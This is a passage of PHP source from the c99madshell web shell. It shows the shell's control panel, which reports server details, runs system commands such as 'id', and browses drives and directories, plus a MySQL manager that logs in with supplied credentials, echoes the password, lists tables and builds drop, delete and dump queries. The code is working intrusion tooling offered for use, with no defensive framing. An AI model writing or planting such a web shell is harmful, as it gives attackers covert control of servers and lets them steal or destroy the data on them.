if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"&lt;a href=\"#\" onclick=\"document.todo.act.value='phpinfo';document.todo.submit();\"&gt;&lt;b&gt;&lt;u&gt;PHP/".phpversion()."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;",htmlspecialchars($DISP_SERVER_SOFTWARE));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF
@ini_set("highlight.comment",$highlight_comment); //#FF8000
@ini_set("highlight.default",$highlight_default); //#0000BB
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.keyword",$highlight_keyword); //#007700
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;&lt;meta http-equiv="Content-Language" content="en-us"&gt;&lt;title&gt;<?php echo getenv("HTTP_HOST"); ?> - c99madshell&lt;/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;/style&gt;&lt;/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;form name='todo' method='POST'&gt;&lt;input name='act' type='hidden' value=''&gt;&lt;input name='grep' type='hidden' value=''&gt;&lt;input name='fullhexdump' type='hidden' value=''&gt;&lt;input name='base64' type='hidden' value=''&gt;&lt;input name='nixpasswd' type='hidden' value=''&gt;&lt;input name='pid' type='hidden' value=''&gt;&lt;input name='c' type='hidden' value=''&gt;&lt;input name='white' type='hidden' value=''&gt;&lt;input name='sig' type='hidden' value=''&gt;&lt;input name='processes_sort' type='hidden' value=''&gt;&lt;input name='d' type='hidden' value=''&gt;&lt;input name='sort' type='hidden' value=''&gt;&lt;input name='f' type='hidden' value=''&gt;&lt;input name='ft' type='hidden' value=''&gt;&lt;/form&gt;&lt;center&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"&gt;&lt;p&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;/b&gt;&lt;/font&gt;&lt;a href="<?php echo $surl; ?>"&gt;&lt;font face="Verdana" size="5"&gt;&lt;b&gt;C99madShell v. <?php echo $shver; ?>&lt;/b&gt;&lt;/font&gt;&lt;/a&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;&lt;/center&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align="left"&gt;&lt;b&gt;Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"&lt;br&gt;",1); ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;<?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br&gt;",1);} else {echo get_current_user();} ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;Safe-mode:&nbsp;<?php echo $hsafemode; ?>&lt;/b&gt;&lt;/p&gt;&lt;p align="left"&gt;<?php
$d = str_replace("\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\","\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "&lt;a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($t)."';document.todo.sort.value='".$sort."';document.todo.submit();\"&gt;&lt;b&gt;".htmlspecialchars($b).DIRECTORY_SEPARATOR."&lt;/b&gt;&lt;/a&gt;";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (is_writable($d))
{
 $wd = TRUE;
 $wdt = "&lt;font color=green&gt;[ ok ]&lt;/font&gt;";
 echo "&lt;b&gt;&lt;font color=green&gt;".view_perms(fileperms($d))."&lt;/font&gt;&lt;/b&gt;";
}
else
{
 $wd = FALSE;
 $wdt = "&lt;font color=red&gt;[ Read-Only ]&lt;/font&gt;";
 echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
 if ($free &lt; 0) {$free = 0;}
 if ($total &lt; 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "&lt;br&gt;&lt;b&gt;Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)&lt;/b&gt;";
}
echo "&lt;br&gt;";
$letters = "";
if ($win)
{
 $v = explode("\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
  if (!$bool) {$bool = is_dir($letter.":\");}
  if ($bool)
  {
   $letters .= "&lt;a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($letter.":\")."';document.todo.submit();\"&gt;[ ";
   if ($letter.":" != $v) {$letters .= $letter;}
   else {$letters .= "&lt;font color=green&gt;".$letter."&lt;/font&gt;";}
   $letters .= " ]&lt;/a&gt; ";
  }
 }
 if (!empty($letters)) {echo "&lt;b&gt;Detected drives&lt;/b&gt;: ".$letters."&lt;br&gt;";}
}
if (count($quicklaunch) &gt; 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%sort",$sort,$item[1]);
  $v = realpath($d."..");
  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
  $item[1] = str_replace("%upd",urlencode($v),$item[1]);

  echo "&lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt;&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
echo "&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "&lt;TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=\"100%\" valign=\"top\"&gt;".$donated_html."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";}
echo "&lt;TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=\"100%\" valign=\"top\"&gt;";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 echo("&lt;form name='sql' method='POST'&gt;&lt;input name='act' type='hidden' value='sql'&gt;&lt;input name='sql_tbl_insert_q' type='hidden' value=''&gt;&lt;input name='sql_login' type='hidden' value=''&gt;&lt;input name='kill' type='hidden' value=''&gt;&lt;input name='sql_order' type='hidden' value=''&gt;&lt;input name='sql_tbl_ls' type='hidden' value=''&gt;&lt;input name='sql_tbl_le' type='hidden' value=''&gt;&lt;input name='sql_tbl_act' type='hidden' value=''&gt;&lt;input name='thistbl' type='hidden' value=''&gt;&lt;input name='sql_passwd' type='hidden' value=''&gt;&lt;input name='sql_server' type='hidden' value=''&gt;&lt;input name='sql_port' type='hidden' value=''&gt;&lt;input name='sql_db' type='hidden' value=''&gt;&lt;input name='sql_act' type='hidden' value=''&gt;&lt;input name='sql_tbl' type='hidden' value=''&gt;&lt;input name='f' type='hidden' value=''&gt;&lt;input name='ft' type='hidden' value=''&gt;&lt;input name='sql_query' type='hidden' value=''&gt;&lt;/form&gt;");

 if (isset($_POST['sql_login']))  {$sql_login=htmlspecialchars($_POST['sql_login']);}
 if (isset($_POST['sql_passwd'])) {$sql_passwd=htmlspecialchars($_POST['sql_passwd']);}
 if (isset($_POST['sql_server'])) {$sql_server=htmlspecialchars($_POST['sql_server']);}
 if (isset($_POST['sql_port']))   {$sql_port=htmlspecialchars($_POST['sql_port']);}
 if (isset($_POST['sql_db']))     {$sql_db=htmlspecialchars($_POST['sql_db']);}
 if (isset($_POST['sql_act']))     {$sql_act=htmlspecialchars($_POST['sql_act']);}
 if (isset($_POST['sql_tbl']))     {$sql_tbl=htmlspecialchars($_POST['sql_tbl']);}
 if (isset($_POST['sql_tbl_act']))     {$sql_tbl_act=htmlspecialchars($_POST['sql_tbl_act']);}
 if (isset($_POST['thistbl']))     {$thistbl=htmlspecialchars($_POST['thistbl']);}
 if (isset($_POST['sql_order']))     {$sql_order=htmlspecialchars($_POST['sql_order']);}
 if (isset($_POST['sql_tbl_ls']))     {$sql_tbl_ls=htmlspecialchars($_POST['sql_tbl_ls']);}
 if (isset($_POST['sql_tbl_le']))     {$sql_tbl_le=htmlspecialchars($_POST['sql_tbl_le']);}
 if (isset($_POST['sql_query']))     {$sql_query=htmlspecialchars($_POST['sql_query']);}
 if (isset($_POST['sql_tbl_insert_q'])) {$sql_tbl_insert_q=urldecode(htmlspecialchars($_POST['sql_tbl_insert_q']));}
 if (isset($_POST['sql_tbl_insert_functs'])) {$sql_tbl_insert_functs=htmlspecialchars($_POST['sql_tbl_insert_functs']);}
 if (isset($_POST['sql_tbl_insert_radio'])) {$sql_tbl_insert_radio=htmlspecialchars($_POST['sql_tbl_insert_radio']);}



 ?>&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;td width="100%" height="1" colspan="2" valign="top"&gt;&lt;center&gt;<?php
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
  $err = mysql_smarterror();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = FALSE;}
 echo "&lt;b&gt;SQL Manager:&lt;/b&gt;&lt;br&gt;";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "NO CONNECTION";}
  else {echo "&lt;center&gt;&lt;b&gt;Can't connect&lt;/b&gt;&lt;/center&gt;"; echo "&lt;b&gt;".$err."&lt;/b&gt;";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();");
  $sqlquicklaunch[] = array("Query","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();");
  $sqlquicklaunch[] = array("Server-status","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='serverstatus';document.sql.submit();");
  $sqlquicklaunch[] = array("Server variables","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='servervars';document.sql.submit();");
  $sqlquicklaunch[] = array("Processes","#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='processes';document.sql.submit();");
  $sqlquicklaunch[] = array("Logout","#\" onclick=\"document.sql.act.value='sql';document.sql.submit();");
  echo "&lt;center&gt;&lt;b&gt;MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")&lt;/b&gt;&lt;br&gt;";
  if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;&lt;b&gt;".$item[0]."&lt;/b&gt;&lt;/a&gt; ] ";}}
  echo "&lt;/center&gt;";
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
 if (!$sql_sock) {?>&lt;td width="28%" height="100" valign="top"&gt;&lt;center&gt;&lt;font size="5"&gt; i &lt;/font&gt;&lt;/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width="90%" height="1" valign="top"&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;form action="<?php echo $surl; ?>" method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type="text" name="sql_login" value="root" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="sql_passwd" value="" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_db" value="" maxlength="64"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type="text" name="sql_server" value="localhost" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_port" value="3306" maxlength="6" size="3"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Connect"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;<?php }
 else
 {
  //Start left panel
  if (!empty($sql_db))
  {
   ?>&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="#" onclick="document.sql.act.value='sql';document.sql.sql_login.value='<?echo (htmlspecialchars($sql_login)) ?>';document.sql.sql_passwd.value='<?echo (htmlspecialchars($sql_passwd)) ?>';document.sql.sql_server.value='<?echo (htmlspecialchars($sql_server)) ?>';document.sql.sql_port.value='<?echo (htmlspecialchars($sql_port)) ?>';document.sql.submit();"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
   $result = mysql_list_tables($sql_db);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    echo "---[ &lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_db.value='".htmlspecialchars($sql_db)."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.submit();\"&gt;&lt;b&gt;".htmlspecialchars($sql_db)."&lt;/b&gt;&lt;/a&gt; ]---&lt;br&gt;";
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "&lt;b&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".htmlspecialchars($sql_db)."';document.sql.sql_tbl.value='".htmlspecialchars($row[0])."';document.sql.submit();\"&gt;&lt;b&gt;".htmlspecialchars($row[0])."&lt;/b&gt;&lt;/a&gt; (".$count_row[0].")&lt;/br&gt;&lt;/b&gt;"; mysql_free_result($count); $c++;}
    if (!$c) {echo "No tables found in database.";}
   }
  }
  else
  {
   ?>&lt;td width="1" height="100" valign="top"&gt;&lt;a href="<?php echo $_SERVER['PHP_SELF']; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
   $result = mysql_list_dbs($sql_sock);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    ?>&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;select name="sql_db"&gt;<?php
    $c = 0;
    $dbs = "";
    while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
    echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
    echo $dbs;
   }
   ?>&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;<?php
  }
  //End left panel
  echo "&lt;/td&gt;&lt;td width=\"100%\" height=\"1\" valign=\"top\"&gt;";
  //Start center panel
  $diplay = TRUE;
  if ($sql_db)
  {
   if (!is_numeric($c)) {$c = 0;}
   if ($c == 0) {$c = "no";}
   echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").&lt;br&gt;";
   if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt; ] ";}}
   echo "&lt;/b&gt;&lt;/center&gt;";
   $acts = array("","dump");
   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "
`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` 
";} $sql_act = "query";}
   elseif ($sql_act == "tbldump") {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "
`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "
`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "
`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "
`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;
";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
   elseif ($sql_tbl_act == "insert")
   {
    if ($sql_tbl_insert_radio == 1)
    {
     $keys = "";
     $akeys = array_keys($sql_tbl_insert);
     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
     $values = "";
     $i = 0;
     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
    elseif ($sql_tbl_insert_radio == 2)
    {
     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
     $result = mysql_query($sql_query) or print(mysql_smarterror());
     $result = mysql_fetch_array($result, MYSQL_ASSOC);
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
   }
   if ($sql_act == "query")
   {
    $sql_query = urldecode($sql_query);
    echo "&lt;hr size=\"1\" noshade&gt;";
    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
    if ((!$submit) or ($sql_act)) {echo "&lt;table border=\"0\" width=\"100%\" height=\"1\"&gt;&lt;tr&gt;&lt;td&gt;&lt;form method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt;&nbsp;&lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";}
   }
   if (in_array($sql_act,$acts))
   {
    ?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newtbl"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newtbl" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="dump"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"&gt;&nbsp;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" 